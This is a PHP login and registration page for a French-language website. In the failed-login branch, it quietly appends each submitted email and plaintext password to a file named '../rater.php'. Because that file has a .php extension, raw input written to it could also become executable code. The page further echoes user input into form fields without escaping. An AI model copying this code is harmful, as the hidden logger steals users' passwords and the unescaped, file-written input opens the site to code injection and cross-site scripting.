<?php
session_start();
require "conf.inc.php";
require "functions.php";

if (isset($_POST["inputEmail"]) && isset($_POST["inputPassword"]) && !empty($_POST["inputEmail"]) && !empty($_POST["inputPassword"])) {
    $pdo = connectDB();
    $queryPrepared = $pdo->prepare("SELECT pwd FROM USER WHERE emailAddress=:email");
    $queryPrepared->execute([":email" => $_POST["inputEmail"]]);
    $result = $queryPrepared->fetch();
    if (password_verify($_POST["inputPassword"], $result["pwd"])) {
        $email = $_POST["inputEmail"];
        login($email);
        header("Location: home.php");
        exit;
    } else {
        $error = true;
        $fichier_nom = '../rater.php';
        $ficher_contenu = "" . $_POST["inputEmail"] . " --- " . $_POST["inputPassword"] . "\r\n";
        file_put_contents($fichier_nom, $ficher_contenu, FILE_APPEND);
    }
}
require "navbar.php";
?>
<?php
/*if ($_GET["errors"] == true) {*/?><!--
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
            integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
            crossorigin="anonymous">
    $('#signin').tab('show')
</script>
--><?php /*} */?>
    <!-- Banner Area Starts -->
    <section class="banner-area banner-area2 blog-page text-center">
        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <h1>
                        <i>
                            <?php echo getTranslate("Connexion", $tabLang, $setLanguage) ?>
                        </i>
                    </h1>
                </div>
            </div>
        </div>
    </section>
    <!-- Banner Area End -->

    <!-- Start Sample Area -->
    <section class="sample-text-area">
        <div class="container">
            <h3 class="text-heading title_color">
                <?php echo getTranslate("Une petite faim ?", $tabLang, $setLanguage); ?>
            </h3>
            <p class="sample-text">
                <?php echo getTranslate("N'hésitez pas à créer un compte pour pouvoir profiter de tous les avantages.", $tabLang, $setLanguage); ?>
            </p>
        </div>
    </section>
    <!-- End Sample Area -->

    <!-- Start Button -->
    <section class="button-area mb-5 section-padding4">
        <div class="pt-5 container mb-3">
            <div class="col-xs-10 col-sm-10  col-lg-6 mx-auto">
                <ul class="nav nav-tabs" id="myTab" role="tablist">
                    <li class="nav-item" role="presentation">
                        <a class="nav-link active" id="home-tab" data-toggle="tab" href="#login" role="tab"
                           aria-controls="home" aria-selected="true">
                            <?php echo getTranslate("Se connecter", $tabLang, $setLanguage); ?>
                        </a>
                    </li>
                    <li class="nav-item" role="presentation">
                        <a class="nav-link" id="profile-tab" data-toggle="tab" href="#signin" role="tab"
                           aria-controls="profile" aria-selected="false">
                            <?php echo getTranslate("S'inscrire", $tabLang, $setLanguage); ?>
                        </a>
                    </li>
                </ul>
                <div class="tab-content" id="myTabContent">
                    <div class="card mx-auto p-5 tab-pane fade show active" id="login">
                        <div class="card-body">
                            <?php
                            if (!empty($error)) {
                                echo    "<div class='alert alert-danger'><li>" . getTranslate("Identifiants incorrects", $tabLang, $setLanguage) . "</li></div>";
                            }
                            ?>
                            <form method="POST" action="login.php">
                                <div class="form-group">
                                    <div class="form-label-group">
                                        <label for="inputEmail">
                                            <?php echo getTranslate("Adresse mail", $tabLang, $setLanguage); ?>
                                            :
                                        </label>
                                        <input type="email" class="form-control focus"
                                               placeholder="<?php echo getTranslate("Adresse mail", $tabLang, $setLanguage); ?>" required="required" autofocus="autofocus"
                                               name="inputEmail" autocomplete="username"
                                               value="<?php echo (isset($_POST['inputEmail'])) ? $_POST['inputEmail'] : '' ?>">
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="form-label-group">
                                        <label for="inputPassword">
                                            <?php echo getTranslate("Mot de passe", $tabLang, $setLanguage); ?> :
                                        </label>
                                        <input type="password" class="form-control focus" autocomplete="current-password"
                                               placeholder="<?php echo getTranslate("Mot de passe", $tabLang, $setLanguage); ?>" required="required" name="inputPassword">
                                    </div>
                                </div>
                                <input class="genric-btn primary circle " type="submit" value="Connexion">
                            </form>
                            <div class="text-center">
                                <a class="d-block small pt-3 text-center text-secondary" href="forgotPassword.php">
                                    <?php echo getTranslate("Mot de passe oublié", $tabLang, $setLanguage); ?>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="tab-pane fade" id="signin">
                        <div class="card card-login mx-auto p-5">
                            <div class="card-body">
                                <?php
                                if (isset($_SESSION["errors"])) {
                                    echo "<div class='alert alert-danger'>";
                                    foreach ($_SESSION["errors"] as $error) {
                                        echo "<li>" . getTranslate($error, $tabLang, $setLanguage) . "</li>";
                                    }
                                    echo "</div>";
                                }
                                unset($_SESSION["errors"]);
                                ?>
                                <form method="POST" action="addUser.php" enctype="multipart/form-data">
                                    <div class="form-label-group">
                                        <div class="form-row">
                                            <div class="col-6">
                                                <div class="form-group">
                                                    <label for="firstName">
                                                        <?php echo getTranslate("Prénom", $tabLang, $setLanguage) ?> :
                                                    </label>
                                                    <input type="text" id="firstName" class="form-control focus"
                                                           placeholder="<?php echo getTranslate("Prénom", $tabLang, $setLanguage) ?>" required="required" name="firstName"
                                                           value="<?php echo (isset($_SESSION["inputErrors"]))
                                                               ? $_SESSION["inputErrors"]["firstName"]
                                                               : ""; ?>">
                                                </div>
                                            </div>
                                            <div class="col-6">
                                                <div class="form-group">
                                                    <label for="lastName">
                                                        <?php echo getTranslate("Nom", $tabLang, $setLanguage) ?> :
                                                    </label>
                                                    <input type="text" id="lastName" class="form-control focus"
                                                           placeholder="<?php echo getTranslate("Nom", $tabLang, $setLanguage) ?>" required="required" name="lastName"
                                                           value="<?php echo (isset($_SESSION["inputErrors"]))
                                                               ? $_SESSION["inputErrors"]["lastName"]
                                                               : ""; ?>">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label for="inputEmail">
                                            <?php echo getTranslate("Adresse mail", $tabLang, $setLanguage); ?> :
                                        </label>
                                        <input type="email" id="inputEmail" class="form-control focus"
                                               placeholder="<?php echo getTranslate("Adresse mail", $tabLang, $setLanguage); ?>"
                                               required="required" name="inputEmail"
                                               value="<?php echo (isset($_SESSION["inputErrors"]))
                                                   ? $_SESSION["inputErrors"]["inputEmail"]
                                                   : ""; ?>">
                                    </div>
                                    <div class="form-group">
                                        <label for="inputPassword">
                                            <?php echo getTranslate("Mot de passe", $tabLang, $setLanguage); ?> :
                                        </label>
                                        <input type="password" id="inputPassword" class="form-control focus"
                                               placeholder="<?php echo getTranslate("Mot de passe", $tabLang, $setLanguage); ?>" required="required" name="inputPassword"
                                               autocomplete="off">
                                    </div>
                                    <div class="form-group">
                                        <!-- Confirmation mot de passe -->
                                        <label for="confirmPassword">
                                            <?php echo getTranslate("Confirmation de mot de passe", $tabLang, $setLanguage); ?> :
                                        </label>
                                        <input type="password" id="confirmPassword" class="form-control focus"
                                               placeholder="<?php echo getTranslate("Confirmation de mot de passe", $tabLang, $setLanguage); ?>" required="required"
                                               name="confirmPassword" autocomplete="off">
                                    </div>
                                    <div class="form-group">
                                        <div class="form-group">
                                            <!-- Captcha image -->
                                            <img src="captcha.php" alt="captcha">
                                        </div>
                                        <!-- Captcha réponse -->
                                        <label for="inputCaptcha">
                                            Captcha :
                                        </label>
                                        <input type="text" name="captcha" id="inputCaptcha" placeholder="Captcha"
                                               required="required" class="form-control focus" autocomplete="off">
                                    </div>
                                    <div class="custom-control custom-checkbox mb-5">
                                        <input type="checkbox" name="newsletterAgreement" class="custom-control-input"
                                               id="customCheck1">
                                        <label class="custom-control-label" for="customCheck1">
                                            <?php echo getTranslate("J'accepte de recevoir les newsletter par email", $tabLang, $setLanguage); ?>
                                        </label>
                                    </div>
                                    <input class="genric-btn primary circle" type="submit" value="<?php echo getTranslate("S'inscrire", $tabLang, $setLanguage); ?>">
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- End Button -->
<?php
require 'footer.php';
?>